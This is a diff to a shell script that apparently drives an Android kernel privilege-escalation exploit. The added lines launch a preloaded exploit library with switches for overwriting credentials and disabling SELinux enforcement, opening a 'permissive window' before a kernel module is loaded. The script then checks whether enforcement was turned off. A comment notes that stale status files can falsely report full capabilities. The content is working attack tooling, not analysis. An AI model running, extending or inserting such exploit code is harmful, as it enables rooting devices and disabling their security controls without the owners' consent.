@@ -30,6 +30,19 @@ else
 fi
 sleep 30
 
+# mt84+: E5v3 permissive window BEFORE C/KO (kernel-SID finit_module needs it)
+echo "--- E5v3 permissive window ---" >> $LOG
+timeout 250 env \
+  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
+  PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 \
+  PSELECT_CONSUMER_CPU=6 \
+  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
+  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
+  PSELECT_NO_CANARY=1 \
+  LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 > $OUTD/E5.out 2>&1
+E5ENF=$(getenforce)
+echo "E5 rc=$? enforce=$E5ENF" >> $LOG
+
 # mt86: child 心跳新鲜度校验 — stale 文件同样含 CapEff=full, 不可盲信
 NOW=$(date +%s); MT=$(stat -c %Y $OUTD/mt49_child_status.txt 2>/dev/null || echo 0)
 AGE=$((NOW-MT))
